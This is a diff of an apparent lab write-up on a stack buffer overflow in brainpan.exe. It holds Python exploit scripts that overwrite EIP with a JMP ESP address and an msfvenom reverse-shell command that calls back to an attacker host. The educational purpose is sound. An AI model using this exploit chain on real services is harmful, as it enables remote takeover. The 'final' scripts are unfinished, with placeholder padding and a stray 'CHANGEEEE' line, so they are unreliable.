@@ -236,118 +236,362 @@ And we can see that EIP was overwritten with the 41 = A characters that the scri
 
 <br/>
 
-## CALCULATION OF EIP OFFSET
+## CALCULATION OF EIP OFFSET AND OVERWRITTING IT
+<br/>
+
+Now, we need to search which part of the buffer is in the EIP register using a different string of "AAA...".
 
 <br/>
+
+For that purpose, we can use msf-pattern_create tool:
+
+```bash
+msf-pattern_create -l 600
+
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
+```
 <br/>
-<br/>
-> Curabitur blandit tempus porttitor. Nullam quis risus eget urna mollis ornare vel eu leo. Nullam id dolor id nibh ultricies vehicula ut id elit.
 
-Etiam porta **sem malesuada magna** mollis euismod. Cras mattis consectetur purus sit amet fermentum. Aenean lacinia bibendum nulla sed consectetur.
+So, the fuzzing script will be as follows:
 
-## Inline HTML elements
+```python
+#!/usr/bin/python
 
-HTML defines a long list of available inline tags, a complete list of which can be found on the [Mozilla Developer Network](https://developer.mozilla.org/en-US/docs/Web/HTML/Element).
+import socket
+import time
+import sys
 
-* **To bold text**, use `<strong>`.
-* *To italicize text*, use `<em>`.
-* Abbreviations, like <abbr title="HyperText Markup Langage">HTML</abbr> should use `<abbr>`, with an optional `title` attribute for the full phrase.
-* Citations, like <cite>&mdash; Thiago Rossener</cite>, should use `<cite>`.
-* <del>Deleted</del> text should use `<del>` and <ins>inserted</ins> text should use `<ins>`.
-* Superscript <sup>text</sup> uses `<sup>` and subscript <sub>text</sub> uses `<sub>`.
+size = 600
+ip = "192.168.74.131"
+port = 9999
 
 
-Most of these elements are styled by browsers with few modifications on our part.
+try:
+    print "\nSending pattern of size: %s" % size
+    buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"
 
-# Heading 1
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip,port))
+    s.send(buffer)
+    s.close()
+    time.sleep(3)
 
-## Heading 2
-
-### Heading 3
-
-#### Heading 4
-
-Vivamus sagittis lacus vel augue rutrum faucibus dolor auctor. Duis mollis, est non commodo luctus, nisi erat porttitor ligula, eget lacinia odio sem nec elit. Morbi leo risus, porta ac consectetur ac, vestibulum at eros.
-
---page-break--
-
-## Code
-
-Cum sociis natoque penatibus et magnis dis `code element` montes, nascetur ridiculus mus.
-
-```php
-// Example can be run directly in your JavaScript console
-<?php
-
-print($a+$b);
-echo "hola";
-
-?>
-
+except:
+    print "\nService Crash !!!"
+    sys.exit()
 ```
 
-Aenean lacinia bibendum nulla sed consectetur. Etiam porta sem malesuada magna mollis euismod. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa.
+<br/>
 
-## Lists
+We run the binary, attach the procces to inmunnity debbuger and run the fuzzing script to obtain the value of EIP:
 
-Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Aenean lacinia bibendum nulla sed consectetur. Etiam porta sem malesuada magna mollis euismod. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet risus.
+![placeholder](/assets/img/uploads/bufoverflow1/16.png "Large example image")
 
-* Praesent commodo cursus magna, vel scelerisque nisl consectetur et.
-* Donec id elit non mi porta gravida at eget metus.
-* Nulla vitae elit libero, a pharetra augue.
+> The new value is EIP= 35724134
 
-Donec ullamcorper nulla non metus auctor fringilla. Nulla vitae elit libero, a pharetra augue.
+<br/>
 
-1. Vestibulum id ligula porta felis euismod semper.
-2. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus.
-3. Maecenas sed diam eget risus varius blandit sit amet non magna.
+And search the byte possition of the chain in the original string using the msf-pattern_offset tool:
 
-Cras mattis consectetur purus sit amet fermentum. Sed posuere consectetur est at lobortis.
+```bash
+msf-pattern_offset -l 600 -q 35724134
 
-Integer posuere erat a ante venenatis dapibus posuere velit aliquet. Morbi leo risus, porta ac consectetur ac, vestibulum at eros. Nullam quis risus eget urna mollis ornare vel eu leo.
+[*] Exact match at offset 524
+```
 
-## Images
+Changing the script will be as follows:
 
-Quisque consequat sapien eget quam rhoncus, sit amet laoreet diam tempus. Aliquam aliquam metus erat, a pulvinar turpis suscipit at.
+```python
+#!/usr/bin/python
 
-![placeholder](https://placehold.it/800x400 "Large example image") ![placeholder](https://placehold.it/400x200 "Medium example image") ![placeholder](https://placehold.it/200x200 "Small example image")
+import socket
+import time
+import sys
 
-## Tables
+size = 524
+eip = 4
+ip = "192.168.74.131"
+port = 9999
 
-Aenean lacinia bibendum nulla sed consectetur. Lorem ipsum dolor sit amet, consectetur adipiscing elit.
 
-<table>
-  <thead>
-    <tr>
-      <th>Name</th>
-      <th>Upvotes</th>
-      <th>Downvotes</th>
-    </tr>
-  </thead>
-  <tfoot>
-    <tr>
-      <td>Totals</td>
-      <td>21</td>
-      <td>23</td>
-    </tr>
-  </tfoot>
-  <tbody>
-    <tr>
-      <td>Alice</td>
-      <td>10</td>
-      <td>11</td>
-    </tr>
-    <tr>
-      <td>Bob</td>
-      <td>4</td>
-      <td>3</td>
-    </tr>
-    <tr>
-      <td>Charlie</td>
-      <td>7</td>
-      <td>9</td>
-    </tr>
-  </tbody>
-</table>
+try:
+    print "\nInput buffer of %s bytes" % (size+eip)
+    buffer = "A" * size + "B" * eip
 
-Nullam id dolor id nibh ultricies vehicula ut id elit. Sed posuere consectetur est at lobortis. Nullam quis risus eget urna mollis ornare vel eu leo.
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    s.connect((ip,port))
+    s.send(buffer)
+
+    s.close()
+    
+    time.sleep(3)
+
+except:
+    print "\nService Crash !!!"
+    sys.exit()
+```
+And we can verify that the bytes from 525-528 (4 bytes) of EIP are the B=42 charater:
+
+![placeholder](/assets/img/uploads/bufoverflow1/17.png "Large example image")
+
+<br/>
+
+## CALCULATE SHELL CODE SPACE AND OVERWRITTE THE ESP REGISTER
+
+<br/>
+
+The shellcode will be allocated after the EIP regsiter, for example, we will add 500 bytes of "C" character:
+
+```python
+#!/usr/bin/python
+
+import socket
+import time
+import sys
+
+size = 524
+eip = 4
+shell=500
+ip = "192.168.74.131"
+port = 9999
+
+
+try:
+    print "\nInput buffer of %s bytes" % (size+eip+shell)
+    buffer = "A" * size + "B" * eip + "C" * shell
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    s.connect((ip,port))
+    s.send(buffer)
+
+    s.close()
+    
+    time.sleep(3)
+
+except:
+    print "\nService Crash !!!"
+    sys.exit
+```
+We can verify that the ESP is overwritted by the 500 bytes of "C" character:
+
+![placeholder](/assets/img/uploads/bufoverflow1/18.png "Large example image")
+
+<br/>
+
+## FOUND THE JMP ESP RETURN ADDRESS
+
+Now we need to find a JMP ESP instruction address to redirect the execution of the program to our malicious shell code.
+
+First, using mona.py we look at all the modules to find a valid dll/module:
+
+```bash
+!mona modules
+```
+
+![placeholder](/assets/img/uploads/bufoverflow1/19.png "Large example image")
+
+> The valid module is brainban.exe.
+
+Next, we need to find a valid OPCODE for the JMP ESP instruction using msf-nasm_shell tool:
+
+```bash
+msf-nasm_shell
+```
+![placeholder](/assets/img/uploads/bufoverflow1/20.png "Large example image")
+
+With this code FFE4 (Hex transformed), we need to find a JMP ESP instruction address using the following command:
+
+```bash
+!mona find -s "\xff\xe4" -m "brainpan.exe"
+```
+
+![placeholder](/assets/img/uploads/bufoverflow1/21.png "Large example image")
+
+> And we found the address: 0x311712F3.
+
+The address correspond to a valid JMP ESP instruction address:
+
+![placeholder](/assets/img/uploads/bufoverflow1/22.png "Large example image")
+
+<br/>
+
+
+## OVERWRITE THE EIP WITH JMP ESP RETURN ADDRESS
+
+<br/>
+
+We need to change the "BBBB" string with the JMP ESP RETURN ADDRESS.
+
+```python
+#!/usr/bin/python
+
+import socket
+import time
+import sys
+
+size = 524
+eip = "\xf3\x12\x17\x31"
+shell = 400
+ip = "192.168.74.131"
+port = 9999
+
+
+try:
+    print "\nInput buffer of %s bytes" % (size)
+    buffer = "A" * size + eip + "C" * shell
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    s.connect((ip,port))
+    s.send(buffer)
+
+    s.close()
+    
+    time.sleep(3)
+
+except:
+    print "\nService Crash !!!"
+    sys.exit()
+```
+
+When the script is executed, the EIP has the address of the JMP ESP instruction address.
+
+![placeholder](/assets/img/uploads/bufoverflow1/24.png "Large example image")
+
+And the EIP point to the overflow shell content of C:
+
+![placeholder](/assets/img/uploads/bufoverflow1/23.png "Large example image")
+
+<br/>
+
+## GENERATE THE REVERSE SHELLCODE AND LOCAL TESTING
+
+<br/>
+
+We use msfvenom to create the payload using the following command:
+
+<br/>
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.74.129 LPORT=444 EXITFUNC=thread -f python  -a x86 -b "\x00"
+```
+
+![placeholder](/assets/img/uploads/bufoverflow1/25.png "Large example image")
+
+
+We need to adapt the previous python code to add the payload instead the "C" strings:
+
+```python
+#!/usr/bin/python
+
+import socket
+import time
+import sys
+
+size = 524
+eip = "\xf3\x12\x17\x31"
+shell = 400
+ip = "192.168.74.131"
+port = 9999
+
+
+try:
+    print "\nInput buffer of %s bytes" % (size)
+    buffer = "A" * size + eip + "C" * shell
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    s.connect((ip,port))
+    s.send(buffer)
+
+    s.close()
+    
+    time.sleep(3)
+
+except:
+    print "\nService Crash !!!"
+    sys.exit()
+
+
+    CHANGEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
+```
+
+Start the service in the windows local machine and execute the python script:
+
+
+![placeholder](/assets/img/uploads/bufoverflow1/26.png "Large example image")
+![placeholder](/assets/img/uploads/bufoverflow1/27.png "Large example image")
+
+As the attacker machine was listening with netcat, we obtain a reverse shell:
+
+![placeholder](/assets/img/uploads/bufoverflow1/28.png "Large example image")
+
+> IT WORKS!!
+
+<br/>
+
+## EXPLOTATION OF REMOTE MACHINE
+
+<br/>
+
+The python script used for exploting the service are the following:
+
+```python
+#!/usr/bin/python
+
+import socket
+import time
+import sys
+
+size = 524
+eip = "\xf3\x12\x17\x31"
+shell = 400
+ip = "192.168.74.131"
+port = 9999
+
+
+try:
+    print "\nInput buffer of %s bytes" % (size)
+    buffer = "A" * size + eip + "C" * shell
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    s.connect((ip,port))
+    s.send(buffer)
+
+    s.close()
+    
+    time.sleep(3)
+
+except:
+    print "\nService Crash !!!"
+    sys.exit()
+
+
+    CHANGEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
+```
+
+The remote IP was 192.168.74.130 and has a remote service of brainpan.exe in PORT 9999. Executing the script with the remote IP:
+
+![placeholder](/assets/img/uploads/bufoverflow1/29.png "Large example image")
+
+And obtain a reverse shell in the attacker machine:
+
+![placeholder](/assets/img/uploads/bufoverflow1/30.png "Large example image")
+
+<br/>
+
+## PRIVILEGE SCALATION ON LINUX MACHINE
+
+<br/>
+
+
+
+
+
+<br/>
+<br/>
+<br/>
+
